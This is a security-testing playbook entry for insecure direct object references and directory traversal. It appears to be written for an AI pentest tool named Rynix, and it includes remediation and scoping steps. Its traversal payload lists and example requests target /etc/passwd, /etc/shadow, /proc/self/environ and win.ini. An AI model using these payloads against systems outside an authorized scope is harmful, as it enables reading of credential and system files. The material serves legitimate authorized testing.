---
id: WSTG-ATHZ-01
title: Testing for Insecure Direct Object References
category: Authorization
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
---

# WSTG-ATHZ-01: Testing for Insecure Direct Object References (IDOR) and Directory Traversal

## Summary

Insecure Direct Object References (IDOR) occur when an application exposes internal object references (IDs, filenames, keys) in a way that allows an attacker to access unauthorized resources by manipulating these references. Directory traversal allows accessing files outside the intended directory via path manipulation.

## Test Objectives

- Identify endpoints that reference objects by user-controllable IDs or filenames
- Test if authorization is enforced when accessing other users' resources
- Test for path traversal vulnerabilities in file-serving functionality

## Prerequisites

- At least two test accounts with different privilege levels
- Target application endpoints that reference objects by ID or filename
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify Object References

**CLI Actions:**
1. Use `curl` to find requests with numeric IDs or filenames in URLs:
   - `/api/users/123`
   - `/documents/report.pdf`
   - `/profile?id=456`
   - `/download?file=document.pdf`
2. Use `curl` with pattern `[?&](id|user_id|doc|file|order|account)=` to find parameterized references

### Step 2: Test Horizontal Privilege Escalation (IDOR)

**CLI Actions:**
1. Log in as User A, capture a request that accesses User A's data (e.g., `/api/users/100`)
2. Use `save to manual-review file` with this request
3. Use `curl` to change the ID to another user's ID:
   ``
   GET /api/users/101 HTTP/1.1
   Host: target.com
   Cookie: session=<user_a_session>
   ``
4. Check if User A can access User B's data
5. Test with sequential IDs: 99, 100, 101, 102
6. Test with UUIDs if applicable - try other known UUIDs

### Step 3: Test Vertical Privilege Escalation

**CLI Actions:**
1. As a regular user, use `curl` to access admin-level resources:
   ``
   GET /api/admin/users HTTP/1.1
   Cookie: session=<regular_user_session>
   ``
2. Test admin endpoints discovered in proxy history with regular user cookies

### Step 4: Test Directory Traversal

**CLI Actions:**
For any endpoint that accepts file paths, use `curl` with traversal payloads:

**Linux targets:**
```
GET /download?file=../../../etc/passwd HTTP/1.1
GET /download?file=....//....//....//etc/passwd HTTP/1.1
GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
GET /download?file=..%252f..%252f..%252fetc/passwd HTTP/1.1
```

**Windows targets:**
```
GET /download?file=..\..\..\windows\win.ini HTTP/1.1
GET /download?file=..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1
```

Use `curl --data-urlencode` to encode payloads when needed.

### Step 5: Test Parameter Manipulation

**CLI Actions:**
1. Test modifying non-obvious references with `curl`:
   - Change `role=user` to `role=admin` in requests
   - Change `is_admin=false` to `is_admin=true`
   - Modify price, quantity, or amount fields
2. Test with encoded or hashed IDs - try base64-decoding IDs with `base64 -d`

## Payloads

### IDOR Test Values
```
0
1
-1
99999999
null
undefined
(empty)
```

### Directory Traversal Payloads (Linux)
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
```

### Directory Traversal Payloads (Windows)
```
..\..\..\..\windows\win.ini
..%5c..%5c..%5c..%5cwindows%5cwin.ini
....\\....\\....\\windows\\win.ini
..%255c..%255c..%255cwindows%255cwin.ini
```

## Detection Criteria

A finding should be logged when:
- Changing object IDs allows access to other users' data (IDOR)
- A regular user can access admin-only resources
- Directory traversal payloads return file contents from outside the web root
- Modifying parameters grants unintended access or privileges

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| IDOR allows access to other users' PII or sensitive data | High |
| Directory traversal reads system files (/etc/passwd, win.ini) | High |
| IDOR allows modification of other users' data | High |
| Vertical escalation to admin functionality | Critical |
| IDOR on non-sensitive resources (public data) | Low |
| Traversal blocked but error reveals file existence | Informational |

## Remediation

- Implement proper authorization checks on every object access (not just authentication)
- Use indirect references (mapping tables) instead of direct database IDs
- Validate and sanitize all file path inputs
- Use allowlists for file access rather than blocklists
- Implement role-based access control (RBAC) consistently
- Use UUIDs instead of sequential IDs where possible

## References

- [OWASP Testing Guide - Directory Traversal](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V4 Access Control — horizontal and vertical privilege checks.
- V13 API — object-level authorization on every endpoint.

## CWE references

- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control

## Rynix tooling

- Primary tools: ``run_idor_matrix``, ``compare_role_response``, ``rbac_matrix``, ``check_access``

## Test focus

- Mandatory cross-role comparison on every object ID parameter.
- Document 403 vs 404 behavior — both can indicate IDOR signals.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

